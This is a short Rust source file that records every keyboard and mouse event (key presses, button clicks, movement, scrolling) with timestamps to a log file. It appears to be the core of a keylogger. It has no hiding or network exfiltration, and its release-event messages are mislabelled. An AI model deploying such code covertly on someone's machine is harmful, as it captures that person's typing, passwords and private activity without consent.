
use crate::logger::file_creation_and_write;
pub fn callback(event:Event){
    match event.event_type{
        EventType::KeyPress(key)=>{
       let msg=format!("Key pressed is {:?} at time {:?}\n",key,event.time);
       file_creation_and_write(msg);
    }
    EventType::KeyRelease(key)=>{
        let msg=format!("Key released is {:?} at time {:?}\n",key,event.time);
        file_creation_and_write(msg);
    }
    EventType::ButtonPress(Button::Left)=>{
       let msg=format!("Button Pressed is {:?} at time {:?}\n",Button::Left,event.time);
       file_creation_and_write(msg);
    }
    EventType::ButtonPress(Button::Right)=>{
        let msg=format!("Button Pressed is {:?} at time {:?}\n",Button::Right,event.time);
        file_creation_and_write(msg);
    }
    EventType::ButtonPress(Button::Middle)=>{
        let msg=format!("Button Pressed is {:?} at time {:?}\n",Button::Middle,event.time);
        file_creation_and_write(msg);
    }
    EventType::ButtonRelease(Button::Left)=>{
        let msg=format!("Button Released is {:?} at time {:?}\n",Button::Left,event.time);
        file_creation_and_write(msg);
    }
    EventType::ButtonRelease(Button::Right)=>{
        let msg=format!("Button Pressed is {:?} at time {:?}\n",Button::Right,event.time);
        file_creation_and_write(msg);
    }
    EventType::ButtonRelease(Button::Middle)=>{
         let msg=format!("Button Pressed is {:?} at time {:?}\n",Button::Middle,event.time);
         file_creation_and_write(msg);
    }
    EventType::MouseMove { x, y }=>{
      let msg=format!("Mouse moved {} {}\n",x,y);
      file_creation_and_write(msg);
    }
    EventType::Wheel { delta_x, delta_y }=>{
        let msg=format!("Wheel scrolled at {} {}\n",delta_x,delta_y);
        file_creation_and_write(msg);
    }
    _=>{
        let msg=String::from("Unknown key");
        file_creation_and_write(msg);
    }
}
} 

pub fn call_listener(){
    if let Err(error)=listen(callback){
    println!("Error is {:?}",error);
  }
}